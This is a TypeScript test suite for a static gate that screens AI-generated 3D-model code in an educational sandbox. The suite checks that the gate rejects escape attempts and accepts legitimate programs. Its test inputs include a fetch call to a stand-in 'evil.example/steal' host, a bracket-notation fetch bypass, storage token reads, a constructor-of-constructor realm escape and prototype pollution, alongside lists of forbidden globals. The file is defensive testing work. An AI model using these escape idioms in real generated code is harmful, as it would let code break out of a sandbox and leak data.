/**
 * Adversarial tests for the static gate.
 *
 * `04-BACKEND.md` demands exactly this suite: "The static gate gets escape attempts: forbidden tokens in
 * every hiding place (strings, template literals, comments, property access) must be caught." And `09`
 * raises the stakes: "a regression here is a vulnerability, and the suite is the only thing that catches
 * it cheaply."
 *
 * Two classes of test, and both matter. The escape attempts prove the gate rejects; the false-positive
 * tests prove it accepts real code — because a gate that fails legitimate programs burns paid generations
 * and, worse, trains whoever maintains it to loosen the wrong rule.
 */
import { describe, expect, it } from 'vitest';
import { runStaticGate, describeViolations } from '../src/static-gate.ts';
import type { GateViolation } from '@edu3d/contracts';

/** A representative API surface. The real one is generated from the engine's registry. */
const API_SURFACE = new Set([
  'scene.part',
  'scene.group',
  'scene.mesh',
  'scene.instances',
  'scene.param',
  'scene.metric',
  'scene.onFrame',
  'scene.camera',
  'scene.light',
  'scene.defineComponent',
  'scene.place',
  'scene.story',
  'scene.quiz',
  'scene.info',
  'geom.box',
  'geom.sphere',
  'geom.mesh',
  'geom.revolve',
  'geom.sweep',
  'geom.parametric',
  'geom.sdf',
  'geom.twist',
  'mat.metal',
  'mat.glass',
  'mat.emissive',
  'M.sin',
  'M.cos',
  'M.PI',
  'M.lerp',
  'M.vec3',
  'console.log',
  'random.float',
  'random.int',
]);

const gate = (source: string) => runStaticGate(source, { apiSurface: API_SURFACE });

const kinds = (violations: GateViolation[]) => violations.map((v) => v.kind);

describe('static gate — network and host capability escapes', () => {
  it('rejects a direct fetch', () => {
    const result = gate(`fetch('https://evil.example/steal');`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('forbidden_global');
  });

  it('rejects fetch reached through bracket notation on a literal key', () => {
    // The regex-scanner bypass: no bare `fetch` identifier appears as a callee.
    const result = gate(`const f = globalThis['fetch']; f('x');`);
    expect(result.ok).toBe(false);
  });

  it('rejects globalThis, self and window by name', () => {
    for (const global of ['globalThis', 'self', 'window', 'parent', 'top']) {
      const result = gate(`const leak = ${global};`);
      expect(result.ok, global).toBe(false);
      expect(kinds(result.violations), global).toContain('forbidden_global');
    }
  });

  it('rejects DOM access', () => {
    const result = gate(`document.body.innerHTML = 'pwned';`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('forbidden_global');
  });

  it('rejects storage access', () => {
    for (const store of ['localStorage', 'sessionStorage', 'indexedDB', 'caches']) {
      const result = gate(`${store}.getItem('token');`);
      expect(result.ok, store).toBe(false);
    }
  });

  it('rejects worker creation, which would be a route to a fresh realm', () => {
    const result = gate(`const w = new Worker('data:text/javascript,fetch("/")');`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('forbidden_global');
  });

  it('rejects postMessage, the only channel back to the host', () => {
    const result = gate(`postMessage({ type: 'built' });`);
    expect(result.ok).toBe(false);
  });

  it('rejects timers, because a guest timer would outlive its model', () => {
    for (const timer of ['setTimeout', 'setInterval', 'requestAnimationFrame', 'queueMicrotask']) {
      const result = gate(`${timer}(() => {}, 0);`);
      expect(result.ok, timer).toBe(false);
    }
  });
});

describe('static gate — dynamic code escapes', () => {
  it('rejects eval', () => {
    const result = gate(`eval('fetch("/")');`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('dynamic_code');
  });

  it('rejects the Function constructor', () => {
    const result = gate(`const f = new Function('return this');`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('dynamic_code');
  });

  it('rejects the constructor-of-constructor realm escape', () => {
    // The canonical one-liner: reach Function through any object's prototype chain.
    const result = gate(`const g = ({}).constructor.constructor('return this')();`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('prototype_access');
  });

  it('rejects the same escape spelled with brackets', () => {
    const result = gate(`const g = ({})['constructor']['constructor']('return this')();`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('prototype_access');
  });

  it('rejects __proto__ manipulation', () => {
    const result = gate(`const o = {}; o.__proto__.polluted = true;`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('prototype_access');
  });

  it('rejects prototype mutation of a shared intrinsic', () => {
    const result = gate(`Array.prototype.map = function () { return []; };`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('prototype_access');
  });

  it('rejects `with`, which makes scope analysis undecidable', () => {
    const result = gate(`with (Math) { const x = sin(1); }`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('dynamic_code');
  });
});

describe('static gate — module escapes', () => {
  it('rejects a static import', () => {
    const result = gate(`import * as fs from 'node:fs';\nscene.group({ id: 'root' });`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('module_syntax');
  });

  it('rejects a dynamic import', () => {
    const result = gate(`const fs = import('node:fs');`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('module_syntax');
  });

  it('rejects require', () => {
    const result = gate(`const fs = require('node:fs');`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('forbidden_global');
  });

  it('rejects export syntax', () => {
    const result = gate(`export const model = 1;`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('module_syntax');
  });
});

describe('static gate — hiding places', () => {
  it('accepts a forbidden word inside a string, because a string is not a capability', () => {
    // The complement of the bracket-notation test: `'fetch'` as *data* is harmless, and rejecting it
    // would mean a model could not name the concept in an info panel. The gate reasons about bindings.
    const result = gate(
      `scene.info({ id: 'a', title: 'Fetch decoding', summary: 'How the CPU fetch stage works' });`,
    );
    expect(result.ok).toBe(true);
  });

  it('accepts a forbidden word inside a comment', () => {
    const result = gate(
      `// This model does not use fetch or document.\nscene.group({ id: 'root' });`,
    );
    expect(result.ok).toBe(true);
  });

  it('rejects a computed member whose literal key is a forbidden global', () => {
    const result = gate(`const target = {}; const leak = target['localStorage'];`);
    expect(result.ok).toBe(false);
  });

  it('reserves the runtime prefix so the loop guard cannot be shadowed', () => {
    const result = gate(`function __edu3d_tick() {}\nwhile (true) {}`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('forbidden_global');
  });
});

describe('static gate — scope awareness', () => {
  it('accepts a local variable that shadows a global name', () => {
    // `location` here is the model's own word for a position. A token scanner would reject this program
    // and the learner would lose a generation to a false positive.
    const source = `
      const location = M.vec3(0, 1, 0);
      scene.group({ id: 'root', position: location });
    `;
    const result = gate(source);
    expect(result.ok).toBe(true);
  });

  it('accepts a parameter named like a global', () => {
    const source = `
      function place(parent, name) {
        return scene.group({ id: name, parentId: parent });
      }
      place('root', 'stage');
    `;
    const result = gate(source);
    expect(result.ok).toBe(true);
  });

  it('accepts a destructured binding that shadows a global', () => {
    const source = `
      const { history, top } = { history: 1, top: 2 };
      scene.param({ id: 'x', kind: 'number', label: 'X', min: 0, max: history + top, default: 1 });
    `;
    const result = gate(source);
    expect(result.ok).toBe(true);
  });

  it('resolves a hoisted function used before its declaration', () => {
    const source = `
      buildStage();
      function buildStage() { scene.group({ id: 'stage' }); }
    `;
    const result = gate(source);
    expect(result.ok).toBe(true);
  });

  it('accepts a property named like a forbidden global', () => {
    // `part.document` is a property access on the model's own object, not a global reference.
    const source = `const part = { document: 'spec sheet' }; console.log(part.document);`;
    const result = gate(source);
    expect(result.ok).toBe(true);
  });
});

describe('static gate — API surface', () => {
  it('rejects a hallucinated scene-API method', () => {
    const result = gate(`scene.addAwesomeRocket({ stages: 3 });`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('unknown_api');
    expect(result.violations[0]?.message).toContain('scene.addAwesomeRocket');
  });

  it('accepts every documented member', () => {
    const source = `
      const body = geom.revolve({ profile: [[0, 0], [1, 0], [1, 2]] });
      const shell = mat.glass({ color: '#88ccff' });
      scene.mesh({ id: 'tank', geometry: body, material: shell });
      scene.onFrame((ctx) => { ctx.time; });
    `;
    const result = gate(source);
    expect(result.ok).toBe(true);
    expect(result.apiCalls).toContain('geom.revolve');
    expect(result.apiCalls).toContain('scene.onFrame');
  });

  it('records API calls even when the surface check is disabled', () => {
    const result = runStaticGate(`geom.box({ size: [1, 1, 1] });`, { apiSurface: new Set() });
    expect(result.ok).toBe(true);
    expect(result.apiCalls).toContain('geom.box');
  });

  it('rejects an undefined free identifier as an unknown API rather than passing it through', () => {
    const result = gate(`buildTurbine(38);`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('unknown_api');
  });

  it('rejects phys.body as unknown_api, naming the call — no host binds a phys namespace', () => {
    // GUEST_BINDINGS used to advertise `phys`, but every host (guest, node-host, worker) binds
    // only scene, geom, mat, M, console and random — a model that followed the advertisement got
    // an opaque TypeError inside the sandbox. The gate must refuse it at authoring time, naming
    // the qualified call the repair pass has to delete. Physics is declarative: scene.physics().
    const result = gate(`
      scene.group({ id: 'rig' });
      phys.body({ shape: 'box', mass: 2 });
    `);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('unknown_api');
    expect(result.violations[0]?.message).toContain('phys.body');
  });

  it('rejects a bare phys reference, so indirect use cannot reach the runtime crash either', () => {
    // `var p = phys; p.body(...)` hides the member call behind a local, so the surface check
    // never sees it — the free reference itself is the last line of defence, and it only holds
    // if `phys` is not on the allowed-bindings list.
    const result = gate(`
      var engine = phys;
      scene.group({ id: 'rig' });
    `);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('unknown_api');
    expect(result.violations[0]?.message).toContain('phys');
  });
});

describe('static gate — shape limits', () => {
  it('rejects an empty program', () => {
    const result = gate('');
    expect(result.ok).toBe(false);
  });

  it('rejects a program over the byte ceiling with an instruction to use reuse', () => {
    const huge = `scene.group({ id: 'a' });\n`.repeat(60_000);
    const result = runStaticGate(huge, { apiSurface: API_SURFACE, maxBytes: 100_000 });
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('shape_limit');
    expect(result.violations[0]?.message).toMatch(/instancing|reuse/i);
  });

  it('rejects an oversized string literal, which is data smuggling not modelling', () => {
    const result = gate(`const blob = '${'x'.repeat(25_000)}';`);
    expect(result.ok).toBe(false);
    expect(kinds(result.violations)).toContain('shape_limit');
  });

  it('reports a syntax error with a position the repair prompt can use', () => {
    const result = gate(`scene.group({ id: 'root'`);
    expect(result.ok).toBe(false);
    expect(result.violations[0]?.kind).toBe('syntax');
    expect(result.violations[0]?.line).toBeGreaterThan(0);
  });
});

describe('static gate — ambitious programs are not penalised', () => {
  it('accepts a large procedural assembly with nested loops and component reuse', () => {
    // This is the shape 00-GOAL demands be ordinary: hundreds of parts from a few definitions. The gate
    // must not treat ambition as anomaly.
    const source = `
      const bladeProfile = [];
      for (let i = 0; i <= 24; i++) {
        const t = i / 24;
        bladeProfile.push([M.sin(t * M.PI) * 0.4, t * 1.2]);
      }
      const blade = geom.sweep({ profile: bladeProfile, twist: 0.6, segments: 32 });
      const steel = mat.metal({ color: '#b8c0c8', roughness: 0.25 });

      scene.defineComponent('stage', (ctx) => {
        const hub = geom.revolve({ profile: [[0.2, 0], [0.5, 0], [0.5, 0.3]] });
        ctx.mesh({ id: 'hub', geometry: hub, material: steel });
        const placements = [];
        for (let b = 0; b < 38; b++) {
          placements.push({ rotation: [0, (b / 38) * M.PI * 2, 0], position: [0, 0, 0] });
        }
        ctx.instances({ id: 'blades', geometry: blade, material: steel, placements });
      });

      for (let s = 0; s < 6; s++) {
        scene.place('stage', { id: 'stage' + s, position: [0, 0, s * 0.6] });
      }

      scene.param({ id: 'rpm', kind: 'number', label: 'Spool speed', min: 0, max: 12000, default: 4200 });
      scene.onFrame((ctx) => {
        for (let s = 0; s < 6; s++) {
          ctx.part('stage' + s).setRotation([0, ctx.time * ctx.params.rpm * 0.001, 0]);
        }
      });
    `;
    const result = gate(source);
    expect(result.ok, JSON.stringify(result.violations)).toBe(true);
    expect(result.guardedLoops).toBeGreaterThanOrEqual(4);
  });

  it('accepts raw typed-array mesh construction, the expressive escape hatch', () => {
    const source = `
      const positions = new Float32Array(3 * 3);
      const indices = new Uint32Array([0, 1, 2]);
      positions[0] = 0; positions[4] = 1; positions[8] = 1;
      const g = geom.mesh({ positions, indices });
      scene.mesh({ id: 'tri', geometry: g, material: mat.matte ? mat.metal({}) : mat.metal({}) });
    `;
    const result = runStaticGate(source, {
      apiSurface: new Set([...API_SURFACE, 'mat.matte']),
    });
    expect(result.ok, JSON.stringify(result.violations)).toBe(true);
  });
});

describe('describeViolations', () => {
  it('groups repeated violations so a repair instruction stays short', () => {
    const source = `fetch('a'); fetch('b'); fetch('c');`;
    const result = gate(source);
    const described = describeViolations(result);
    expect(described).toHaveLength(1);
    expect(described[0]).toMatch(/3 occurrences/);
  });

  it('includes the line number so the model can find the offending code', () => {
    const result = gate(`scene.group({ id: 'root' });\ndocument.title = 'x';`);
    const described = describeViolations(result);
    expect(described[0]).toMatch(/line 2/);
  });
});
